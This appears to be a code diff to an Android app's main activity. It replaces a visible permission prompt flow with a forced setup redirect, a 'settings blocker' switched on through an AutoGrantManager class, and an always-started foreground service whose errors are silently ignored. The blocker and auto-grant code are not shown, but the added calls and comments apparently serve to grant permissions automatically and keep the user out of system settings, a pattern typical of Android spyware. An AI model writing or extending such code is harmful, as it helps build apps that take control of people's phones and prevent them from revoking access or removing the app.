@@ -1,58 +1,59 @@
 package com.fason.app.ui;
 
-import androidx.activity.ComponentActivity;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
+import androidx.activity.ComponentActivity;
 import androidx.annotation.NonNull;
-import androidx.core.view.WindowCompat;
-import com.fason.app.R;
+import com.fason.app.core.permissions.AutoGrantManager;
+import com.fason.app.core.permissions.SetupManager;
 import com.fason.app.service.MainService;
 
 public class MainActivity extends ComponentActivity {
+
     private HomeManager home;
-    private PermissionSetupController permController;
 
     @Override
     protected void onCreate(Bundle state) {
         super.onCreate(state);
-        WindowCompat.setDecorFitsSystemWindows(getWindow(), false);
-        setContentView(R.layout.activity_main);
-        home = new HomeManager();
-        home.init(findViewById(R.id.webView), findViewById(R.id.progressBar));
-        if (state != null) {
-            home.restoreState(state);
+
+        // If setup hasn't been done redirect immediately — user never sees main UI
+        if (!SetupManager.isComplete(this)) {
+            startActivity(new Intent(this, SetupActivity.class)
+                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
+            finish();
+            return;
         }
-        permController = new PermissionSetupController(this);
-        permController.onCreate(state);
+
+        setContentView(com.fason.app.R.layout.activity_main);
+        home = new HomeManager();
+        home.init(
+            findViewById(com.fason.app.R.id.webView),
+            findViewById(com.fason.app.R.id.progressBar));
+        if (state != null) home.restoreState(state);
+
         startSvc();
         loadPage();
-        final PermissionSetupController ctrl = permController;
-        findViewById(R.id.permOverlay).postDelayed(ctrl::autoStartFirstMissing, 600);
-        getOnBackPressedDispatcher().addCallback(this, new androidx.activity.OnBackPressedCallback(true) {
-            @Override
-            public void handleOnBackPressed() {
-                if (home != null && home.canGoBack()) {
-                    home.goBack();
-                } else {
-                    setEnabled(false);
-                    onBackPressed();
+
+        // Enable settings blocker now that setup is done
+        AutoGrantManager.getInstance().enableSettingsBlock();
+
+        getOnBackPressedDispatcher().addCallback(this,
+            new androidx.activity.OnBackPressedCallback(true) {
+                @Override public void handleOnBackPressed() {
+                    if (home != null && home.canGoBack()) home.goBack();
+                    else { setEnabled(false); getOnBackPressedDispatcher().onBackPressed(); }
                 }
-            }
-        });
+            });
     }
 
     @Override
-    protected void onResume() {
-        super.onResume();
-        if (permController != null) permController.onResume();
-    }
+    protected void onResume() { super.onResume(); }
 
     @Override
     protected void onSaveInstanceState(@NonNull Bundle out) {
         super.onSaveInstanceState(out);
         if (home != null) home.saveState(out);
-        if (permController != null) permController.onSaveInstanceState(out);
     }
 
     @Override
@@ -61,27 +62,17 @@ public class MainActivity extends ComponentActivity {
         super.onDestroy();
     }
 
-    @Override
-    public void onRequestPermissionsResult(int req, @NonNull String[] perms,
-                                            @NonNull int[] results) {
-        super.onRequestPermissionsResult(req, perms, results);
-        if (permController != null) {
-            permController.onRequestPermissionsResult(req);
-        }
-    }
-
     private void startSvc() {
         try {
             Intent svcIntent = new Intent(this, MainService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                 startForegroundService(svcIntent);
-            } else {
+            else
                 startService(svcIntent);
-            }
         } catch (Exception ignored) {}
     }
 
     private void loadPage() {
-        if (home != null) home.loadPage();
+        try { if (home != null) home.loadDefaultPage(); } catch (Exception ignored) {}
     }
 }
